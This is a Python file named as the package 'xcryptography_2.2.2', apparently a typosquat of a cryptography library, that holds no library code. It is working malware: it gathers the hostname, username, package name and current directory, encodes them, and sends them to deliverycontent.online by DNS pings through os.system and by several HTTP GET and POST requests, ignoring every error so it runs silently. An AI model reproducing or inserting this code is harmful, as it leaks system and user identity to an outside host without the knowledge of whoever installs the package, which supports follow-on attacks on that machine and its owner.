package = "xcryptography_2.2.2"
import os
import base64
import random

dns_domain = ".sub.deliverycontent.online"
http_domain = "www.deliverycontent.online"

hostname = ""
try:
    hostname = os.uname().nodename
except Exception:
    pass
if hostname == "":
    try:
        hostname = os.environ['COMPUTERNAME']
    except Exception:
        pass

username = ""
try:
    import getpass
    username = getpass.getuser()
except Exception:
    pass

execution_path = ""
try:
    execution_path = os.getcwd()
except Exception:
    pass

data = "%s;%s;%s;%s" % (hostname, username, package, execution_path)
b64data = base64.b64encode(data.encode()).decode()

data_part_length = 29
parts_count = len(b64data) // data_part_length
if len(b64data) % data_part_length > 0:
    parts_count += 1
parts_count = min(parts_count, 255)

random_number = random.randint(0, 254)

encoded_data = ""
for c in b64data[:data_part_length]:
    encoded_data += "%02x" % ord(c)
data_to_send = "f%s%s%s" % ("%02x" % random_number, "%02x" % parts_count, encoded_data)
domain = data_to_send + dns_domain
try:
    os.system("ping %s" % domain)
except Exception:
    pass

for i in range(1, parts_count):
    encoded_data = ""
    for c in b64data[data_part_length*i: data_part_length*(i+1)]:
        encoded_data += "%02x" % ord(c)
    data_to_send = "%s%s%s" % ("%02x" % random_number, "%02x" % i, encoded_data)
    domain = data_to_send + dns_domain
    try:
        os.system("ping %s" % domain)
    except Exception: 
        pass

encoded_data = ""
for c in b64data:
    encoded_data += "%02x" % ord(c)
data_post = "%s%s%s" % ("gjeiiq1", "%02x" % random_number, encoded_data)
data_get = "%s%s" % ("%02x" % random_number, encoded_data)

try:
    import urllib.request
    r = urllib.request.urlopen("http://%s/p" % http_domain, data=data_post.encode(), timeout=10)
except Exception:
    pass

try:
    import urllib.request
    r = urllib.request.urlopen("http://%s/g?d=%s" % (http_domain, data_get), timeout=10)
except Exception:
    pass

try:
    import requests
    r = requests.post("http://%s/p" % http_domain, data=data_post, timeout=10)
except Exception:
    pass

try:
    import requests
    r = requests.get("http://%s/g?d=%s" % (http_domain, data_get), timeout=10)
except Exception:
    pass

try:
    import urllib
    r = urllib.urlopen("http://%s/p" % http_domain, data=data_post)
except Exception:
    pass

try:
    import urllib
    r = urllib.urlopen("http://%s/g?d=%s" % (http_domain, data_get))
except Exception:
    pass